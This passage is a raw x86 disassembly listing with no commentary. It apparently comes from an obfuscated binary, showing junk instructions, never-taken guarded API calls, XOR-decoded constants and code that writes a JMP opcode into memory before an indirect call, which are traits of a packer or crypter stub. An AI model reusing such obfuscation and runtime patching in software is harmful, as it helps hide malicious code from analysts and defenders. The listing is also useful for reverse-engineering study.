  40d76e:	mov    ebp,esp
  40d770:	sub    esp,0xa8
  40d776:	and    DWORD PTR ds:0x43369b,0x6624
  40d780:	push   ebx
  40d781:	adc    DWORD PTR ds:0x433663,0x6b43
  40d78b:	push   esi
  40d78c:	push   edi
  40d78d:	sbb    DWORD PTR ds:0x43371f,0x4336a7
  40d797:	push   0x413c96
  40d79c:	sub    DWORD PTR ds:0x43364b,0x433763
  40d7a6:	call   DWORD PTR ds:0x412194
  40d7ac:	push   0x413cbe
  40d7b1:	sub    DWORD PTR ds:0x433723,0x43363f
  40d7bb:	call   DWORD PTR ds:0x412174
  40d7c1:	test   eax,eax
  40d7c3:	je     0x40d7d1
  40d7c9:	push   0x2
  40d7cb:	pop    eax
  40d7cc:	jmp    0x40e1cc
  40d7d1:	and    DWORD PTR ds:0x4336b3,0x0
  40d7db:	xor    ecx,ecx
  40d7dd:	xor    ecx,DWORD PTR ds:0x4336b3
  40d7e3:	inc    ecx
  40d7e4:	mov    DWORD PTR ds:0x4336b3,ecx
  40d7ea:	cmp    DWORD PTR ds:0x4336b3,0x24
  40d7f1:	jne    0x40d80b
  40d7f7:	push   DWORD PTR [ebp-0x28]
  40d7fa:	push   DWORD PTR [ebp-0x20]
  40d7fd:	push   0x38c3
  40d802:	push   DWORD PTR [ebp-0x14]
  40d805:	call   DWORD PTR ds:0x412274
  40d80b:	cmp    DWORD PTR ds:0x4336b3,0x1e
  40d812:	jb     0x40d7db
  40d818:	or     DWORD PTR ds:0x433647,0x433767
  40d822:	mov    DWORD PTR [ebp-0x24],0xf89c8535
  40d829:	dec    ecx
  40d82a:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  40d831:	add    ecx,ecx
  40d833:	lea    eax,[ebp-0x2c]
  40d836:	and    DWORD PTR ds:0x43364f,0x0
  40d840:	jmp    0x40d852
  40d845:	mov    ecx,DWORD PTR ds:0x43364f
  40d84b:	inc    ecx
  40d84c:	mov    DWORD PTR ds:0x43364f,ecx
  40d852:	cmp    DWORD PTR ds:0x43364f,0x10
  40d859:	jae    0x40d899
  40d85f:	cmp    DWORD PTR ds:0x43364f,0x4
  40d866:	jne    0x40d87a
  40d86c:	push   0x42d1
  40d871:	push   DWORD PTR [ebp-0x28]
  40d874:	call   DWORD PTR ds:0x4121a0
  40d87a:	cmp    DWORD PTR ds:0x43364f,0x3
  40d881:	jne    0x40d894
  40d887:	mov    ecx,DWORD PTR ds:0x43364f
  40d88d:	inc    ecx
  40d88e:	mov    DWORD PTR ds:0x43364f,ecx
  40d894:	jmp    0x40d845
  40d899:	mov    DWORD PTR [ebp-0x18],eax
  40d89c:	xor    esi,esi
  40d89e:	add    esi,DWORD PTR ds:0x43371b
  40d8a4:	add    esi,DWORD PTR ds:0x4336e3
  40d8aa:	mov    DWORD PTR ds:0x43371b,esi
  40d8b0:	lea    eax,[ebp-0x30]
  40d8b3:	inc    edi
  40d8b4:	mov    DWORD PTR [ebp-0x14],eax
  40d8b7:	mov    eax,ds:0x433647
  40d8bc:	and    eax,DWORD PTR ds:0x4336af
  40d8c2:	mov    ds:0x433647,eax
  40d8c7:	mov    eax,ds:0x413b16
  40d8cc:	sbb    DWORD PTR ds:0x433653,ebx
  40d8d2:	mov    eax,DWORD PTR [eax+0x1c8]
  40d8d8:	mov    eax,DWORD PTR [eax]
  40d8da:	and    DWORD PTR ds:0x43375b,0x0
  40d8e4:	jmp    0x40d8f8
  40d8e9:	xor    edi,edi
  40d8eb:	or     edi,DWORD PTR ds:0x43375b
  40d8f1:	inc    edi
  40d8f2:	mov    DWORD PTR ds:0x43375b,edi
  40d8f8:	cmp    DWORD PTR ds:0x43375b,0x1c
  40d8ff:	jae    0x40d922
  40d905:	cmp    DWORD PTR ds:0x43375b,0x25
  40d90c:	jne    0x40d91d
  40d912:	push   0x6b44
  40d917:	call   DWORD PTR ds:0x4121a4
  40d91d:	jmp    0x40d8e9
  40d922:	mov    ecx,DWORD PTR [ebp-0x14]
  40d925:	sbb    DWORD PTR ds:0x4336a7,0x43375f
  40d92f:	mov    esi,0x7510853
  40d934:	movzx  edi,BYTE PTR ds:0x433653
  40d93b:	and    edi,DWORD PTR ds:0x43372f
  40d941:	mov    DWORD PTR ds:0x433653,edi
  40d947:	xor    eax,esi
  40d949:	mov    DWORD PTR ds:0x4336a7,0x13
  40d953:	cmp    DWORD PTR ds:0x4336a7,0x0
  40d95a:	je     0x40d9b9
  40d960:	cmp    DWORD PTR ds:0x4336a7,0x3
  40d967:	jne    0x40d985
  40d96d:	push   0x5b51
  40d972:	push   DWORD PTR [ebp-0x18]
  40d975:	push   0x1bb9
  40d97a:	push   0x295c
  40d97f:	call   DWORD PTR ds:0x412278
  40d985:	cmp    DWORD PTR ds:0x4336a7,0x4
  40d98c:	jne    0x40d99f
  40d992:	mov    edi,DWORD PTR ds:0x4336a7
  40d998:	dec    edi
  40d999:	mov    DWORD PTR ds:0x4336a7,edi
  40d99f:	xor    edi,edi
  40d9a1:	add    edi,DWORD PTR ds:0x4336a7
  40d9a7:	dec    edi
  40d9a8:	mov    DWORD PTR ds:0x4336a7,edi
  40d9ae:	jmp    0x40d953
  40d9b3:	xor    ebx,DWORD PTR ds:0x43364f
  40d9b9:	mov    edi,0x32729a
  40d9be:	add    eax,edi
  40d9c0:	mov    DWORD PTR [ecx],eax
  40d9c2:	mov    eax,ds:0x413dda
  40d9c7:	mov    DWORD PTR ds:0x4336db,ecx
  40d9cd:	cmp    eax,0x22c02f45
  40d9d2:	mov    DWORD PTR ds:0x4336f3,ecx
  40d9d8:	mov    eax,DWORD PTR [ebp-0x4]
  40d9db:	mov    ebx,DWORD PTR ds:0x43369f
  40d9e1:	mov    ebx,0xf89c8539
  40d9e6:	je     0x40da18
  40d9ec:	sub    DWORD PTR ds:0x43365f,edx
  40d9f2:	mov    ecx,DWORD PTR [ebp-0x24]
  40d9f5:	xor    eax,esi
  40d9f7:	add    eax,edi
  40d9f9:	imul   eax,ecx
  40d9fc:	mov    DWORD PTR ds:0x433763,0x5372
  40da06:	mov    DWORD PTR [ebp-0x24],eax
  40da09:	mov    DWORD PTR ds:0x4336eb,0x4650
  40da13:	jmp    0x40db46
  40da18:	xor    eax,esi
  40da1a:	movzx  ecx,WORD PTR ds:0x43364f
  40da21:	sub    DWORD PTR ds:0x433667,ecx
  40da27:	add    eax,edi
  40da29:	mov    ds:0x413c2a,eax
  40da2e:	xor    DWORD PTR ds:0x43365b,edi
  40da34:	mov    eax,DWORD PTR [ebp-0x24]
  40da37:	xor    eax,esi
  40da39:	and    DWORD PTR ds:0x43372f,0x0
  40da43:	jmp    0x40da55
  40da48:	mov    ecx,DWORD PTR ds:0x43372f
  40da4e:	inc    ecx
  40da4f:	mov    DWORD PTR ds:0x43372f,ecx
  40da55:	cmp    DWORD PTR ds:0x43372f,0x19
  40da5c:	jae    0x40da9d
  40da62:	cmp    DWORD PTR ds:0x43372f,0xe
  40da69:	jne    0x40da78
  40da6f:	push   DWORD PTR [ebp-0x14]
  40da72:	call   DWORD PTR ds:0x41227c
  40da78:	cmp    DWORD PTR ds:0x43372f,0xd
  40da7f:	jne    0x40da92
  40da85:	mov    ecx,DWORD PTR ds:0x43372f
  40da8b:	inc    ecx
  40da8c:	mov    DWORD PTR ds:0x43372f,ecx
  40da92:	jmp    0x40da48
  40da97:	sbb    DWORD PTR ds:0x43375b,edx
  40da9d:	add    eax,edi
  40da9f:	and    DWORD PTR ds:0x433697,0x0
  40daa9:	jmp    0x40dabd
  40daae:	xor    ecx,ecx
  40dab0:	or     ecx,DWORD PTR ds:0x433697
  40dab6:	inc    ecx
  40dab7:	mov    DWORD PTR ds:0x433697,ecx
  40dabd:	cmp    DWORD PTR ds:0x433697,0x15
  40dac4:	jae    0x40daf7
  40daca:	cmp    DWORD PTR ds:0x433697,0x1c
  40dad1:	jne    0x40daf2
  40dad7:	push   0x1c72
  40dadc:	push   DWORD PTR [ebp-0xc]
  40dadf:	push   DWORD PTR [ebp-0x14]
  40dae2:	push   0x433974
  40dae7:	push   0x400000
  40daec:	call   DWORD PTR ds:0x412280
  40daf2:	jmp    0x40daae
  40daf7:	mov    ds:0x413dda,eax
  40dafc:	mov    eax,DWORD PTR [ebp-0x4]
  40daff:	or     DWORD PTR ds:0x433663,0x6d3e
  40db09:	mov    ecx,DWORD PTR ds:0x413c2a
  40db0f:	adc    DWORD PTR ds:0x4336a7,0x43364f
  40db19:	xor    eax,esi
  40db1b:	adc    DWORD PTR ds:0x433757,0x260d
  40db25:	add    eax,edi
  40db27:	cmp    ecx,eax
  40db29:	mov    DWORD PTR ds:0x433643,0x58a9
  40db33:	jne    0x40db46
  40db39:	push   ebx
  40db3a:	push   DWORD PTR [ebp-0x4]
  40db3d:	push   DWORD PTR [ebp-0x24]
  40db40:	call   DWORD PTR ds:0x413c22
  40db46:	or     DWORD PTR ds:0x433647,0x68cd
  40db50:	mov    eax,ds:0x413b16
  40db55:	mov    ecx,DWORD PTR ds:0x4336cf
  40db5b:	mov    ecx,DWORD PTR [ecx]
  40db5d:	or     DWORD PTR ds:0x433663,ecx
  40db63:	mov    eax,DWORD PTR [eax+0x18c]
  40db69:	and    DWORD PTR ds:0x43371f,0x0
  40db73:	mov    ecx,DWORD PTR ds:0x43371f
  40db79:	inc    ecx
  40db7a:	mov    DWORD PTR ds:0x43371f,ecx
  40db80:	cmp    DWORD PTR ds:0x43371f,0x21
  40db87:	jne    0x40db9d
  40db8d:	push   0x43371f
  40db92:	push   0x4b8b
  40db97:	call   DWORD PTR ds:0x4121a8
  40db9d:	cmp    DWORD PTR ds:0x43371f,0x1b
  40dba4:	jb     0x40db73
  40dbaa:	mov    eax,DWORD PTR [eax]
  40dbac:	sbb    DWORD PTR ds:0x43369f,0x7dd1
  40dbb6:	mov    DWORD PTR [ebp-0x44],eax
  40dbb9:	mov    DWORD PTR ds:0x433727,0x12
  40dbc3:	cmp    DWORD PTR ds:0x433727,0x0
  40dbca:	je     0x40dc20
  40dbd0:	cmp    DWORD PTR ds:0x433727,0x6
  40dbd7:	jne    0x40dbf0
  40dbdd:	push   0x2c3a
  40dbe2:	push   0x433767
  40dbe7:	push   DWORD PTR [ebp-0x20]
  40dbea:	call   DWORD PTR ds:0x4121ac
  40dbf0:	cmp    DWORD PTR ds:0x433727,0x7
  40dbf7:	jne    0x40dc0a
  40dbfd:	mov    ecx,DWORD PTR ds:0x433727
  40dc03:	dec    ecx
  40dc04:	mov    DWORD PTR ds:0x433727,ecx
  40dc0a:	xor    ecx,ecx
  40dc0c:	or     ecx,DWORD PTR ds:0x433727
  40dc12:	dec    ecx
  40dc13:	mov    DWORD PTR ds:0x433727,ecx
  40dc19:	jmp    0x40dbc3
  40dc1e:	xor    edx,eax
  40dc20:	mov    DWORD PTR [ebp-0x10],ebx
  40dc23:	and    DWORD PTR ds:0x433717,0x0
  40dc2d:	xor    eax,eax
  40dc2f:	or     eax,DWORD PTR ds:0x433717
  40dc35:	inc    eax
  40dc36:	mov    ds:0x433717,eax
  40dc3b:	cmp    DWORD PTR ds:0x433717,0x5
  40dc42:	jne    0x40dc5a
  40dc48:	push   0x433875
  40dc4d:	push   0x1
  40dc4f:	push   0x1
  40dc51:	push   DWORD PTR [ebp-0x20]
  40dc54:	call   DWORD PTR ds:0x4121b0
  40dc5a:	cmp    DWORD PTR ds:0x433717,0x4
  40dc61:	jne    0x40dc72
  40dc67:	mov    eax,ds:0x433717
  40dc6c:	inc    eax
  40dc6d:	mov    ds:0x433717,eax
  40dc72:	cmp    DWORD PTR ds:0x433717,0x18
  40dc79:	jb     0x40dc2d
  40dc7f:	and    DWORD PTR ds:0x43364b,ecx
  40dc85:	mov    DWORD PTR [ebp-0x10],ebx
  40dc88:	mov    DWORD PTR [ebp-0x10],ebx
  40dc8b:	sbb    DWORD PTR ds:0x433647,ebx
  40dc91:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  40dc98:	and    DWORD PTR ds:0x433773,0x6700
  40dca2:	mov    DWORD PTR [ebp-0x10],ebx
  40dca5:	and    DWORD PTR ds:0x43369f,0x0
  40dcaf:	jmp    0x40dcc1
  40dcb4:	mov    ecx,DWORD PTR ds:0x43369f
  40dcba:	inc    ecx
  40dcbb:	mov    DWORD PTR ds:0x43369f,ecx
  40dcc1:	cmp    DWORD PTR ds:0x43369f,0x1d
  40dcc8:	jae    0x40dd19
  40dcce:	cmp    DWORD PTR ds:0x43369f,0x7
  40dcd5:	jne    0x40dce4
  40dcdb:	push   DWORD PTR [ebp-0x1c]
  40dcde:	call   DWORD PTR ds:0x4121b4
  40dce4:	cmp    DWORD PTR ds:0x43369f,0x6
  40dceb:	jne    0x40dd00
  40dcf1:	xor    ecx,ecx
  40dcf3:	add    ecx,DWORD PTR ds:0x43369f
  40dcf9:	inc    ecx
  40dcfa:	mov    DWORD PTR ds:0x43369f,ecx
  40dd00:	jmp    0x40dcb4
  40dd05:	xor    edx,edx
  40dd07:	or     edx,DWORD PTR ds:0x4336a7
  40dd0d:	sbb    edx,DWORD PTR ds:0x433767
  40dd13:	mov    DWORD PTR ds:0x4336a7,edx
  40dd19:	mov    DWORD PTR [ebp-0x10],0xf89c853d
  40dd20:	mov    ecx,DWORD PTR ds:0x43376b
  40dd26:	or     DWORD PTR ds:0x43371b,ecx
  40dd2c:	mov    eax,DWORD PTR [ebp-0x24]
  40dd2f:	sbb    edx,ecx
  40dd31:	mov    ecx,DWORD PTR [ebp-0x4]
  40dd34:	mov    edx,DWORD PTR ds:0x4336b3
  40dd3a:	and    DWORD PTR ds:0x43371f,edx
  40dd40:	mov    edx,DWORD PTR [ebp-0x4]
  40dd43:	xor    edx,esi
  40dd45:	xor    ecx,esi
  40dd47:	add    ecx,edx
  40dd49:	mov    edx,DWORD PTR [ebp-0x4]
  40dd4c:	xor    eax,esi
  40dd4e:	xor    edx,esi
  40dd50:	add    eax,edi
  40dd52:	mov    DWORD PTR ds:0x433657,0x7934
  40dd5c:	lea    ecx,[ecx+edx*1+0x9757ce]
  40dd63:	mov    DWORD PTR ds:0x43364f,0x1f1b
  40dd6d:	mov    DWORD PTR [ebp-0x20],eax
  40dd70:	mov    DWORD PTR ds:0x43365b,0xf60
  40dd7a:	cmp    eax,ecx
  40dd7c:	mov    DWORD PTR ds:0x43376b,0x7c7a
  40dd86:	ja     0x40dec6
  40dd8c:	jmp    0x40dd9e
  40dd91:	sbb    DWORD PTR ds:0x43371b,0x74d8
  40dd9b:	mov    eax,DWORD PTR [ebp-0x20]
  40dd9e:	and    DWORD PTR ds:0x43365b,edi
  40dda4:	mov    ecx,DWORD PTR [ebp-0x4]
  40dda7:	or     DWORD PTR ds:0x4336a7,0x43372f
  40ddb1:	xor    ecx,esi
  40ddb3:	adc    DWORD PTR ds:0x43375f,0x2704
  40ddbd:	lea    eax,[ecx+eax*1+0x32729a]
  40ddc4:	and    DWORD PTR ds:0x43369f,0x7330
  40ddce:	push   eax
  40ddcf:	mov    eax,DWORD PTR [ebp-0x14]
  40ddd2:	xor    eax,esi
  40ddd4:	and    DWORD PTR ds:0x43365b,0x43372f
  40ddde:	lea    eax,[ebp+eax*1+0x3272a2]
  40dde5:	push   eax
  40dde6:	mov    eax,ds:0x43364b
  40ddeb:	or     DWORD PTR ds:0x4336df,eax
  40ddf1:	mov    eax,ds:0x413b16
  40ddf6:	push   DWORD PTR [eax+0x1bc]
  40ddfc:	adc    DWORD PTR ds:0x43375b,0x4336b3
  40de06:	call   0x403290
  40de0b:	add    DWORD PTR ds:0x433763,0x32bd
  40de15:	mov    eax,DWORD PTR [ebp-0x4]
  40de18:	mov    ecx,DWORD PTR [ebp-0x20]
  40de1b:	sbb    DWORD PTR ds:0x4336ef,ecx
  40de21:	xor    eax,esi
  40de23:	and    DWORD PTR ds:0x4336ab,0x0
  40de2d:	mov    edx,DWORD PTR ds:0x4336ab
  40de33:	inc    edx
  40de34:	mov    DWORD PTR ds:0x4336ab,edx
  40de3a:	cmp    DWORD PTR ds:0x4336ab,0x23
  40de41:	jne    0x40de57
  40de47:	push   0x303f
  40de4c:	push   0x8a6d
  40de51:	call   DWORD PTR ds:0x4121b8
  40de57:	cmp    DWORD PTR ds:0x4336ab,0x15
  40de5e:	jb     0x40de2d
  40de64:	lea    eax,[ecx+eax*1+0x32729a]
  40de6b:	sbb    DWORD PTR ds:0x433767,0x3009
  40de75:	mov    ecx,DWORD PTR [ebp-0x4]
  40de78:	mov    edx,DWORD PTR [ebp-0x4]
  40de7b:	xor    edx,esi
  40de7d:	add    DWORD PTR ds:0x43371b,0x46c0
  40de87:	xor    ecx,esi
  40de89:	xor    DWORD PTR ds:0x433757,0x4fa5
  40de93:	add    ecx,edx
  40de95:	and    edx,DWORD PTR ds:0x433763
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	adc    DWORD PTR ds:0x433697,0x7c2
  40dea8:	xor    edx,esi
  40deaa:	lea    ecx,[ecx+edx*1+0x9757ce]
  40deb1:	mov    DWORD PTR [ebp-0x20],eax
  40deb4:	cmp    eax,ecx
  40deb6:	mov    DWORD PTR ds:0x4336e7,0x1689
  40dec0:	jbe    0x40dd91
  40dec6:	mov    eax,DWORD PTR [ebp+0xc]
  40dec9:	mov    ds:0x41399a,eax
  40dece:	mov    eax,DWORD PTR [ebp+0x10]
  40ded1:	mov    ds:0x413bee,eax
  40ded6:	mov    eax,ds:0x41399a
  40dedb:	mov    ecx,DWORD PTR [ebp-0x18]
  40dede:	push   DWORD PTR [ebp-0x44]
  40dee1:	sub    eax,edi
  40dee3:	push   DWORD PTR [ebp-0x30]
  40dee6:	xor    eax,esi
  40dee8:	mov    DWORD PTR [ecx],eax
  40deea:	push   DWORD PTR [ebp-0x2c]
  40deed:	call   0x40e1d3
  40def2:	sub    eax,edi
  40def4:	xor    eax,esi
  40def6:	mov    DWORD PTR [ebp+0xc],eax
  40def9:	mov    ecx,DWORD PTR [ebp-0x4]
  40defc:	mov    eax,DWORD PTR [ebp+0xc]
  40deff:	xor    ecx,esi
  40df01:	add    ecx,edi
  40df03:	xor    edx,edx
  40df05:	div    ecx
  40df07:	mov    ecx,DWORD PTR [ebp-0x24]
  40df0a:	cmp    ecx,eax
  40df0c:	jne    0x40e135
  40df12:	mov    eax,ds:0x413b16
  40df17:	mov    DWORD PTR [ebp+0x10],eax
  40df1a:	mov    eax,ds:0x413c26
  40df1f:	mov    DWORD PTR [ebp-0x50],eax
  40df22:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  40df29:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  40df30:	mov    DWORD PTR [ebp-0x4c],0xf89cb535
  40df37:	mov    DWORD PTR [ebp-0x64],0xf89f0535
  40df3e:	mov    DWORD PTR [ebp-0x60],0xf89c85f5
  40df45:	mov    DWORD PTR [ebp-0x54],0xf89c85d5
  40df4c:	mov    eax,DWORD PTR [ebp-0x18]
  40df4f:	xor    eax,esi
  40df51:	add    eax,edi
  40df53:	mov    DWORD PTR [ebp-0xc],eax
  40df56:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  40df5d:	mov    BYTE PTR [ebp-0x25],0x67
  40df61:	mov    eax,DWORD PTR [ebp-0x18]
  40df64:	xor    eax,esi
  40df66:	add    eax,edi
  40df68:	mov    DWORD PTR [ebp-0xc],eax
  40df6b:	mov    eax,DWORD PTR [ebp-0x54]
  40df6e:	xor    eax,esi
  40df70:	add    eax,edi
  40df72:	mov    DWORD PTR [ebp-0x40],eax
  40df75:	mov    eax,DWORD PTR [ebp-0x4c]
  40df78:	xor    eax,esi
  40df7a:	add    eax,edi
  40df7c:	mov    DWORD PTR [ebp-0x38],eax
  40df7f:	mov    eax,DWORD PTR [ebp-0x3c]
  40df82:	xor    eax,esi
  40df84:	add    eax,edi
  40df86:	mov    DWORD PTR [ebp-0x34],eax
  40df89:	lea    eax,[ebp-0xa8]
  40df8f:	mov    DWORD PTR [ebp+0xc],eax
  40df92:	mov    eax,DWORD PTR [ebp-0x18]
  40df95:	mov    DWORD PTR [ebp-0x14],eax
  40df98:	mov    eax,DWORD PTR [ebp-0x20]
  40df9b:	mov    DWORD PTR [ebp-0x5c],ebx
  40df9e:	mov    DWORD PTR [ebp-0x10],eax
  40dfa1:	mov    eax,DWORD PTR [ebp-0x5c]
  40dfa4:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfa7:	xor    eax,esi
  40dfa9:	add    eax,0x32729a
  40dfae:	mov    DWORD PTR [ecx],eax
  40dfb0:	mov    eax,DWORD PTR [ebp-0x14]
  40dfb3:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfb6:	xor    eax,esi
  40dfb8:	add    eax,edi
  40dfba:	mov    DWORD PTR [ecx+0x4],eax
  40dfbd:	mov    eax,DWORD PTR [ebp-0x34]
  40dfc0:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfc3:	mov    DWORD PTR [ecx+0x8],eax
  40dfc6:	mov    eax,DWORD PTR [ebp-0x38]
  40dfc9:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfcc:	mov    DWORD PTR [ecx+0xc],eax
  40dfcf:	mov    eax,DWORD PTR [ebp-0x40]
  40dfd2:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd5:	mov    DWORD PTR [ecx+0x10],eax
  40dfd8:	mov    eax,eax
  40dfda:	mov    eax,DWORD PTR [ebp-0x10]
  40dfdd:	xor    eax,esi
  40dfdf:	add    eax,edi
  40dfe1:	je     0x40e012
  40dfe7:	lea    eax,[ebp-0xa8]
  40dfed:	push   eax
  40dfee:	mov    eax,DWORD PTR [ebp-0x20]
  40dff1:	xor    eax,esi
  40dff3:	add    eax,edi
  40dff5:	push   eax
  40dff6:	mov    eax,DWORD PTR [ebp+0x10]
  40dff9:	add    eax,0xaa
  40dffe:	push   eax
  40dfff:	mov    eax,DWORD PTR [ebp+0x10]
  40e002:	mov    eax,DWORD PTR [eax+0x198]
  40e008:	push   DWORD PTR [eax]
  40e00a:	call   0x4100b5
  40e00f:	mov    DWORD PTR [ebp-0x8],eax
  40e012:	cmp    DWORD PTR [ebp-0x8],0x0
  40e016:	je     0x40e135
  40e01c:	lea    eax,[ebp-0xc]
  40e01f:	mov    DWORD PTR [ebp-0x38],eax
  40e022:	mov    eax,DWORD PTR [ebp-0x60]
  40e025:	xor    eax,esi
  40e027:	add    eax,edi
  40e029:	mov    DWORD PTR [ebp-0x40],eax
  40e02c:	mov    eax,DWORD PTR [ebp-0x3c]
  40e02f:	xor    eax,esi
  40e031:	add    eax,edi
  40e033:	mov    DWORD PTR [ebp-0x10],eax
  40e036:	mov    eax,DWORD PTR [ebp-0x8]
  40e039:	mov    DWORD PTR [ebp-0x14],eax
  40e03c:	lea    eax,[ebp-0xa8]
  40e042:	mov    DWORD PTR [ebp+0xc],eax
  40e045:	mov    eax,DWORD PTR [ebp-0x18]
  40e048:	mov    DWORD PTR [ebp-0x18],eax
  40e04b:	mov    eax,DWORD PTR [ebp-0x20]
  40e04e:	mov    DWORD PTR [ebp-0x48],ebx
  40e051:	mov    DWORD PTR [ebp-0x34],eax
  40e054:	mov    eax,DWORD PTR [ebp-0x48]
  40e057:	mov    ecx,DWORD PTR [ebp+0xc]
  40e05a:	xor    eax,esi
  40e05c:	add    eax,0x32729a
  40e061:	mov    DWORD PTR [ecx],eax
  40e063:	mov    eax,DWORD PTR [ebp-0x14]
  40e066:	mov    ecx,DWORD PTR [ebp+0xc]
  40e069:	mov    DWORD PTR [ecx+0x4],eax
  40e06c:	mov    eax,DWORD PTR [ebp-0x10]
  40e06f:	mov    ecx,DWORD PTR [ebp+0xc]
  40e072:	mov    DWORD PTR [ecx+0x8],eax
  40e075:	mov    eax,DWORD PTR [ebp-0x40]
  40e078:	mov    ecx,DWORD PTR [ebp+0xc]
  40e07b:	mov    DWORD PTR [ecx+0xc],eax
  40e07e:	mov    eax,DWORD PTR [ebp-0x38]
  40e081:	mov    ecx,DWORD PTR [ebp+0xc]
  40e084:	mov    DWORD PTR [ecx+0x10],eax
  40e087:	mov    eax,eax
  40e089:	mov    eax,DWORD PTR [ebp-0x14]
  40e08c:	test   eax,eax
  40e08e:	mov    eax,DWORD PTR [ebp-0x34]
  40e091:	jne    0x40e09a
  40e097:	mov    eax,DWORD PTR [ebp-0x18]
  40e09a:	xor    eax,esi
  40e09c:	add    eax,edi
  40e09e:	test   eax,eax
  40e0a0:	je     0x40e0ce
  40e0a6:	lea    eax,[ebp-0xa8]
  40e0ac:	push   eax
  40e0ad:	mov    eax,DWORD PTR [ebp-0x20]
  40e0b0:	xor    eax,esi
  40e0b2:	add    eax,edi
  40e0b4:	push   eax
  40e0b5:	mov    eax,DWORD PTR [ebp+0x10]
  40e0b8:	add    eax,0xee
  40e0bd:	push   eax
  40e0be:	mov    eax,DWORD PTR [ebp+0x10]
  40e0c1:	mov    eax,DWORD PTR [eax+0x198]
  40e0c7:	push   DWORD PTR [eax]
  40e0c9:	call   0x4100b5
  40e0ce:	mov    ecx,DWORD PTR [ebp-0x3c]
  40e0d1:	xor    ecx,esi
  40e0d3:	mov    eax,0xffcd8d66
  40e0d8:	sub    eax,ecx
  40e0da:	sub    eax,DWORD PTR [ebp-0x8]
  40e0dd:	mov    ecx,DWORD PTR [ebp-0x50]
  40e0e0:	add    ecx,eax
  40e0e2:	mov    eax,DWORD PTR [ebp-0x8]
  40e0e5:	mov    DWORD PTR [eax+0x1],ecx
  40e0e8:	mov    al,BYTE PTR [ebp-0x25]
  40e0eb:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ee:	xor    al,0x45
  40e0f0:	sub    al,0x39
  40e0f2:	mov    BYTE PTR [ecx],al
  40e0f4:	lea    eax,[ebp-0x8]
  40e0f7:	inc    BYTE PTR [eax]
  40e0f9:	inc    eax
  40e0fa:	push   eax
  40e0fb:	pop    ecx
  40e0fc:	dec    ecx
  40e0fd:	xchg   ecx,edx
  40e0ff:	dec    BYTE PTR [edx]
  40e101:	push   DWORD PTR [ebp+0x10]
  40e104:	mov    eax,ds:0x413bd2
  40e109:	mov    eax,DWORD PTR [eax]
  40e10b:	push   DWORD PTR [eax]
  40e10d:	lea    eax,ds:0x413bee
  40e113:	push   DWORD PTR [eax]
  40e115:	lea    eax,ds:0x41399a
  40e11b:	push   DWORD PTR [eax]
  40e11d:	lea    eax,ds:0x413bce
  40e123:	push   DWORD PTR [eax]
  40e125:	lea    eax,ds:0x413d06
  40e12b:	push   DWORD PTR [eax]
  40e12d:	xchg   ebx,edx
  40e12f:	inc    ebx
  40e130:	push   ebx
  40e131:	pop    eax
  40e132:	call   DWORD PTR [eax-0x1]
  40e135:	lea    eax,[ebp+0x4]
  40e138:	mov    DWORD PTR [ebp-0x58],eax
  40e13b:	mov    eax,ds:0x413b16
  40e140:	push   0x4
  40e142:	add    eax,0x1cc
  40e147:	push   eax
  40e148:	lea    eax,[ebp-0x1c]
  40e14b:	push   eax
  40e14c:	call   0x403290
  40e151:	mov    eax,DWORD PTR [ebp-0x1c]
  40e154:	mov    eax,DWORD PTR [ebp-0x4]
  40e157:	mov    eax,DWORD PTR [ebp-0x24]
  40e15a:	mov    DWORD PTR [ebp+0xc],eax
  40e15d:	mov    eax,ds:0x413b9a
  40e162:	mov    ecx,DWORD PTR [ebp+0xc]
  40e165:	sub    eax,edi
  40e167:	xor    eax,esi
  40e169:	cmp    eax,ecx
  40e16b:	je     0x40e1b2
  40e171:	mov    eax,ds:0x413b92
  40e176:	mov    ecx,DWORD PTR [ebp+0xc]
  40e179:	sub    eax,edi
  40e17b:	xor    eax,esi
  40e17d:	cmp    eax,ecx
  40e17f:	jne    0x40e195
  40e185:	mov    eax,ds:0x413b9a
  40e18a:	add    eax,DWORD PTR ds:0x413b92
  40e190:	jmp    0x40e19c
  40e195:	mov    eax,DWORD PTR [ebp+0xc]
  40e198:	xor    eax,esi
  40e19a:	add    eax,edi
  40e19c:	mov    ds:0x413b92,eax
  40e1a1:	mov    eax,DWORD PTR [ebp+0xc]
  40e1a4:	xor    eax,esi
  40e1a6:	add    eax,edi
  40e1a8:	mov    ds:0x413b9a,eax
  40e1ad:	jmp    0x40e1bc
  40e1b2:	mov    eax,ds:0x413b9a
  40e1b7:	mov    ds:0x413b92,eax
  40e1bc:	mov    eax,DWORD PTR [ebp-0x58]
  40e1bf:	mov    ecx,DWORD PTR ds:0x413b92
  40e1c5:	add    DWORD PTR [eax],ecx
  40e1c7:	mov    eax,DWORD PTR [ebp-0x1c]
  40e1ca:	mov    eax,DWORD PTR [eax]
  40e1cc:	pop    edi
  40e1cd:	pop    esi
  40e1ce:	pop    ebx
  40e1cf:	leave  
  40e1d0:	ret    0xc
  40e1d3:	push   ebp
  40e1d4:	mov    ebp,esp
  40e1d6:	push   ecx
  40e1d7:	push   ecx
  40e1d8:	mov    DWORD PTR ds:0x433657,0x1ded
  40e1e2:	mov    eax,0xf89c8534
  40e1e7:	mov    ecx,DWORD PTR ds:0x4336df
  40e1ed:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40e1f4:	push   esi
  40e1f5:	mov    esi,0x7be1
  40e1fa:	mov    DWORD PTR [ebp-0x8],eax
  40e1fd:	mov    ecx,DWORD PTR [ebp+0x8]
  40e200:	push   edi
  40e201:	mov    DWORD PTR ds:0x43372b,0x40de
  40e20b:	mov    edi,0x7510853
  40e210:	mov    esi,DWORD PTR ds:0x4336af
  40e216:	mov    esi,0x32729a
  40e21b:	cmp    ecx,eax
  40e21d:	mov    DWORD PTR ds:0x433717,0x680f
  40e227:	je     0x40eaa5
  40e22d:	and    DWORD PTR ds:0x433727,0x0
  40e237:	mov    ecx,DWORD PTR ds:0x433727
  40e23d:	inc    ecx
  40e23e:	mov    DWORD PTR ds:0x433727,ecx
